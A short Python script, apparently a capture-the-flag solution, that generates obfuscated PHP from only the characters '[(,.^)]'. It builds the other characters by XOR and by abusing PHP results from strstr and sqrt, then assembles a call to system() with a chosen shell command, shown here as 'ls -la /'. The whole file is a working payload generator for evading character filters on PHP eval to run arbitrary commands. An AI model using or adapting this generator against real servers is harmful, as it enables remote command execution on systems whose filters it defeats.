#!/usr/bin/env python3

import sys
from itertools import combinations


def expand():
    loop = True
    while loop:
        loop = False
        for com in combinations(list(cs), 2):
            new = chr(ord(com[0]) ^ ord(com[1]))
            if new.isprintable():
                if not new in cs:
                    cs[new] = cs[com[0]] + "^" + cs[com[1]]
                    loop = True


def stringfor(s):
    return ".".join("(" + cs[c] + ")" for c in s)


def build_cs():
    for c in "[(,.^)]":
        cs[c] = f"'{c}'"
    expand()

    p_false = "(" + stringfor("strstr") + ")('.',',')"
    cs["k"] = "((" + p_false + "^" + p_false + ").'.')^'['"
    expand()

    cs["9"] = (
        "(("
        + stringfor("sqrt")
        + ")("
        + stringfor("5")
        + ").'.')["
        + stringfor("12")
        + "]"
    )
    expand()


def system(cmd):
    return "(" + stringfor("system") + ")(" + stringfor(cmd) + ")"


cs = dict()
build_cs()

if __name__ == "__main__":
    print("<?php")
    print(system("ls -la /"))
    print("?>")
